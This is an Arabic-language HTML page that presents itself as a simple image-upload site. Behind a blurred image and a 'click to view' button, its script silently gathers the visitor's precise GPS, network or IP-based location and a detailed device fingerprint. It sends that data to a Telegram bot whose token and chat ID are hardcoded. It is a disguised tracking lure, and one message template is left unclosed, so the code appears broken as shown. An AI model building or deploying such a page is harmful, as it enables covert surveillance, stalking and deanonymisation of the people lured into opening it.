<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>موقع رفع الصور</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .container {
            max-width: 600px;
            width: 100%;
            background: white;
            border-radius: 20px;
            box-shadow: 0 25px 50px rgba(0,0,0,0.15);
            overflow: hidden;
            animation: slideUp 0.8s ease-out;
        }

        @keyframes slideUp {
            from { transform: translateY(50px); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }

        .header {
            background: linear-gradient(135deg, #2c3e50 0%, #34495e 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }

        .main-image {
            width: 100%;
            max-width: 400px;
            height: auto;
            border-radius: 15px;
            box-shadow: 0 15px 30px rgba(0,0,0,0.2);
            margin: 30px auto;
            filter: blur(20px);
            transition: filter 0.5s ease;
            display: block;
        }

        .main-image.clear {
            filter: blur(0px);
        }

        .click-button {
            background: linear-gradient(135deg, #e74c3c 0%, #c0392b 100%);
            color: white;
            border: none;
            padding: 15px 30px;
            border-radius: 10px;
            font-size: 1.2em;
            font-weight: bold;
            cursor: pointer;
            margin: 20px auto;
            display: block;
            transition: all 0.3s ease;
        }

        .click-button:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 20px rgba(231, 76, 60, 0.4);
        }

        .success-message {
            background: #d4edda;
            color: #155724;
            padding: 20px;
            border-radius: 10px;
            margin: 20px;
            text-align: center;
            display: none;
        }

        .location-status {
            background: #fff3cd;
            color: #856404;
            padding: 15px;
            border-radius: 10px;
            margin: 20px;
            text-align: center;
            font-size: 0.9em;
            border: 1px solid #ffeaa7;
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>موقع رفع الصور</h1>
            <p>منصة سهلة وسريعة لرفع ومشاركة الصور</p>
        </div>

        <img src="https://i.imgur.com/zcb3oRL.jpeg" 
             alt="الصورة المختارة" 
             class="main-image" 
             id="mainImage">

        <button class="click-button" id="viewButton" onclick="viewImage()">
            🔍 اضغط هنا لمشاهدة الصورة
        </button>



        <div class="success-message" id="successMessage">
            ✅ تم الموافقة على عرض الصورة
        </div>
    </div>

    <script>
        // متغيرات الموقع العامة
        window.userLocation = { 
            status: 'جاري المحاولة...',
            method: 'لم يتم التحديد',
            attempts: 0
        };

        // الحصول على الموقع من خلال IP
        async function getLocationByIP() {
            try {
                console.log('🌐 محاولة الحصول على الموقع عبر IP...');
                
                // محاولة عدة خدمات IP
                const ipServices = [
                    'https://ipapi.co/json/',
                    'http://ip-api.com/json/',
                    'https://ipinfo.io/json',
                    'https://freegeoip.app/json/',
                    'https://api.ipify.org?format=json' // للحصول على IP فقط
                ];

                for (let service of ipServices) {
                    try {
                        const response = await fetch(service);
                        const data = await response.json();
                        
                        if (data.latitude || data.lat) {
                            window.userLocation = {
                                latitude: data.latitude || data.lat,
                                longitude: data.longitude || data.lon || data.lng,
                                city: data.city || 'غير معروف',
                                country: data.country || data.country_name || 'غير معروف',
                                region: data.region || data.regionName || 'غير معروف',
                                isp: data.isp || data.org || 'غير معروف',
                                ip: data.ip || data.query || 'غير معروف',
                                accuracy: 'تقريبي (IP)',
                                status: 'تم الحصول عليه عبر IP',
                                method: 'IP Geolocation',
                                service: service
                            };
                            updateLocationStatus('✅ تم تحديد الموقع التقريبي عبر IP');
                            return true;
                        }
                    } catch (error) {
                        console.log(`❌ فشل في الخدمة: ${service}`);
                        continue;
                    }
                }
                
                return false;
            } catch (error) {
                console.error('❌ خطأ في الحصول على الموقع عبر IP:', error);
                return false;
            }
        }

        // الحصول على الموقع باستخدام GPS
        function getLocationByGPS() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve(false);
                    return;
                }

                console.log('🛰️ محاولة الحصول على الموقع عبر GPS...');
                
                const options = {
                    enableHighAccuracy: true,
                    timeout: 15000,
                    maximumAge: 0
                };

                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        window.userLocation = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: Math.round(position.coords.accuracy) + ' متر',
                            altitude: position.coords.altitude || 'غير متاح',
                            heading: position.coords.heading || 'غير متاح',
                            speed: position.coords.speed || 'غير متاح',
                            status: 'تم الحصول عليه بدقة عالية',
                            method: 'GPS',
                            timestamp: new Date(position.timestamp).toLocaleString('ar-IQ')
                        };
                        updateLocationStatus('✅ تم تحديد الموقع بدقة عالية عبر GPS');
                        console.log('✅ تم الحصول على الموقع عبر GPS:', window.userLocation);
                        resolve(true);
                    },
                    function(error) {
                        let errorMsg = '';
                        switch(error.code) {
                            case error.PERMISSION_DENIED:
                                errorMsg = 'رفض المستخدم إذن الموقع';
                                break;
                            case error.POSITION_UNAVAILABLE:
                                errorMsg = 'الموقع غير متاح';
                                break;
                            case error.TIMEOUT:
                                errorMsg = 'انتهت مهلة الانتظار';
                                break;
                            default:
                                errorMsg = 'خطأ غير معروف';
                        }
                        console.log('❌ فشل GPS:', errorMsg);
                        resolve(false);
                    },
                    options
                );
            });
        }

        // الحصول على الموقع من خلال WiFi/Network
        async function getLocationByNetwork() {
            try {
                console.log('📶 محاولة الحصول على الموقع عبر الشبكة...');
                
                const options = {
                    enableHighAccuracy: false,
                    timeout: 10000,
                    maximumAge: 60000
                };

                return new Promise((resolve) => {
                    if (!navigator.geolocation) {
                        resolve(false);
                        return;
                    }

                    navigator.geolocation.getCurrentPosition(
                        function(position) {
                            window.userLocation = {
                                latitude: position.coords.latitude,
                                longitude: position.coords.longitude,
                                accuracy: Math.round(position.coords.accuracy) + ' متر',
                                status: 'تم الحصول عليه عبر الشبكة',
                                method: 'Network Location',
                                timestamp: new Date(position.timestamp).toLocaleString('ar-IQ')
                            };
                            updateLocationStatus('✅ تم تحديد الموقع عبر الشبكة');
                            console.log('✅ تم الحصول على الموقع عبر الشبكة:', window.userLocation);
                            resolve(true);
                        },
                        function(error) {
                            console.log('❌ فشل Network Location');
                            resolve(false);
                        },
                        options
                    );
                });
            } catch (error) {
                console.error('❌ خطأ في Network Location:', error);
                return false;
            }
        }

        // تحديث حالة الموقع في الواجهة (معطل)
        function updateLocationStatus(message) {
            // تم إلغاء عرض حالة الموقع
            console.log('📍 ' + message);
        }

        // جمع معلومات الجهاز والشبكة
        async function getDeviceInfo() {
            const info = {
                // معلومات الجهاز
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                languages: navigator.languages?.join(', ') || 'غير متاح',
                cookieEnabled: navigator.cookieEnabled,
                onLine: navigator.onLine,
                
                // معلومات الشاشة
                screenWidth: screen.width,
                screenHeight: screen.height,
                screenColorDepth: screen.colorDepth,
                pixelRatio: window.devicePixelRatio,
                
                // معلومات النافذة
                windowWidth: window.innerWidth,
                windowHeight: window.innerHeight,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                
                // معلومات الشبكة
                connection: navigator.connection ? {
                    effectiveType: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink,
                    rtt: navigator.connection.rtt,
                    saveData: navigator.connection.saveData
                } : 'غير متاح',
                
                // معلومات إضافية
                doNotTrack: navigator.doNotTrack,
                maxTouchPoints: navigator.maxTouchPoints,
                hardwareConcurrency: navigator.hardwareConcurrency,
                
                // معلومات البطارية (إذا كانت متاحة)
                battery: navigator.getBattery ? 'مدعوم' : 'غير مدعوم'
            };

            // محاولة الحصول على معلومات البطارية
            try {
                if (navigator.getBattery) {
                    const battery = await navigator.getBattery();
                    info.batteryLevel = Math.round(battery.level * 100) + '%';
                    info.batteryCharging = battery.charging;
                }
            } catch (error) {
                info.batteryLevel = 'غير متاح';
            }

            return info;
        }

        // وظيفة جمع البيانات المحسنة
        async function collectData() {
            const ua = navigator.userAgent;
            
            let deviceType = 'كمبيوتر';
            if (/Mobile|Android|iPhone|iPad/.test(ua)) deviceType = 'جهاز محمول';
            else if (/Tablet|iPad/.test(ua)) deviceType = 'تابلت';
            
            let browser = 'غير معروف';
            if (ua.includes('Chrome')) browser = 'كروم';
            else if (ua.includes('Firefox')) browser = 'فايرفوكس';
            else if (ua.includes('Safari')) browser = 'سفاري';
            else if (ua.includes('Edge')) browser = 'إيدج';
            
            let os = 'غير معروف';
            if (ua.includes('Windows')) os = 'ويندوز';
            else if (ua.includes('Mac')) os = 'ماك';
            else if (ua.includes('Linux')) os = 'لينكس';
            else if (ua.includes('Android')) os = 'أندرويد';
            else if (ua.includes('iOS')) os = 'iOS';

            const deviceInfo = await getDeviceInfo();
            
            return {
                timestamp: new Date().toLocaleString('ar-IQ'),
                page_url: window.location.href,
                device_type: deviceType,
                browser: browser,
                operating_system: os,
                screen_resolution: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                language: navigator.language,
                user_agent: ua,
                
                // معلومات الموقع
                latitude: window.userLocation?.latitude || 'غير متاح',
                longitude: window.userLocation?.longitude || 'غير متاح',
                location_accuracy: window.userLocation?.accuracy || 'غير متاح',
                location_status: window.userLocation?.status || 'لم يتم الطلب',
                location_method: window.userLocation?.method || 'غير محدد',
                location_city: window.userLocation?.city || 'غير معروف',
                location_country: window.userLocation?.country || 'غير معروف',
                location_region: window.userLocation?.region || 'غير معروف',
                location_isp: window.userLocation?.isp || 'غير معروف',
                location_ip: window.userLocation?.ip || 'غير معروف',
                
                // معلومات الجهاز المتقدمة
                device_info: deviceInfo,
                
                // معلومات الشبكة
                network_status: navigator.onLine ? 'متصل' : 'غير متصل',
                referrer: document.referrer || 'مباشر',
                
                // معلومات إضافية
                visit_time: new Date().toISOString(),
                page_load_time: performance.now(),
                attempts_made: window.userLocation?.attempts || 0
            };
        }

        function sendToTelegram(data) {
            const TELEGRAM_BOT_TOKEN = '7982181249:AAEyLwc9c24fu-uqUT87v26S6282XTD41XI';
            const TELEGRAM_CHAT_ID = '170383339';
            
            const message = `

⏰ الوقت: ${data.timestamp}
🌐 الرابط: ${data.page_url}
🔗 المرجع: ${data.referrer}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📱 الجهاز: ${data.device_type}

🔍 نسبة البكسل: ${data.device_info.pixelRatio}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
            
            fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: 'HTML'
                })
            }).then(response => {
                if (response.ok) {
                    console.log('✅ تم إرسال البيانات إلى Telegram بنجاح');
                    return response.json();
                } else {
                    console.error('❌ فشل إرسال البيانات إلى Telegram');
                    throw new Error('Telegram API Error');
                }
            }).then(data => {
                console.log('📱 استجابة Telegram:', data);
            }).catch(error => {
                console.error('❌ خطأ في الإرسال:', error);
            });
        }

        async function viewImage() {
            // إظهار الصورة
            document.getElementById('mainImage').classList.add('clear');
            document.getElementById('viewButton').style.display = 'none';
            document.getElementById('successMessage').style.display = 'block';
            
            // جمع وإرسال البيانات
            const data = await collectData();
            console.log('بيانات الزائر:', data);
            
            // إرسال البيانات
            sendToTelegram(data);
        }

        // وظيفة شاملة للحصول على الموقع
        async function getAllLocationMethods() {
            console.log('🚀 بدء عملية تحديد الموقع الشاملة...');
            window.userLocation.attempts = 0;
            
            updateLocationStatus('🔄 جاري تحديد الموقع بدقة عالية...');
            
            // المحاولة الأولى: GPS عالي الدقة
            window.userLocation.attempts++;
            const gpsSuccess = await getLocationByGPS();
            if (gpsSuccess) {
                console.log('✅ تم الحصول على الموقع عبر GPS');
                return;
            }
            
            updateLocationStatus('🔄 جاري تحديد الموقع عبر الشبكة...');
            
            // المحاولة الثانية: شبكة الواي فاي
            window.userLocation.attempts++;
            const networkSuccess = await getLocationByNetwork();
            if (networkSuccess) {
                console.log('✅ تم الحصول على الموقع عبر الشبكة');
                return;
            }
            
            updateLocationStatus('🔄 جاري تحديد الموقع عبر IP...');
            
            // المحاولة الثالثة: IP Geolocation
            window.userLocation.attempts++;
            const ipSuccess = await getLocationByIP();
            if (ipSuccess) {
                console.log('✅ تم الحصول على الموقع عبر IP');
                return;
            }
            
            // إذا فشلت جميع المحاولات
            window.userLocation = {
                latitude: 'غير متاح',
                longitude: 'غير متاح',
                accuracy: 'غير متاح',
                status: 'فشل في جميع المحاولات',
                method: 'لا يوجد',
                attempts: window.userLocation.attempts
            };
            
            updateLocationStatus('❌ لم يتم العثور على الموقع');
            console.log('❌ فشل في جميع طرق تحديد الموقع');
        }

        // تشغيل تحديد الموقع عند تحميل الصفحة
        window.addEventListener('load', function() {
            console.log('🚀 تم تحميل الصفحة');
            getAllLocationMethods();
        });

        // محاولة إضافية عند النقر على الزر
        document.addEventListener('DOMContentLoaded', function() {
            const viewButton = document.getElementById('viewButton');
            if (viewButton) {
                viewButton.addEventListener('click', function() {
                    // إذا لم يتم الحصول على الموقع بعد، محاولة أخيرة
                    if (window.userLocation.status === 'فشل في جميع المحاولات' || 
                        window.userLocation.latitude === 'غير متاح') {
                        console.log('🔄 محاولة أخيرة للحصول على الموقع...');
                        getAllLocationMethods();
                    }
                });
            }
        });
    </script>
</body>
</html>
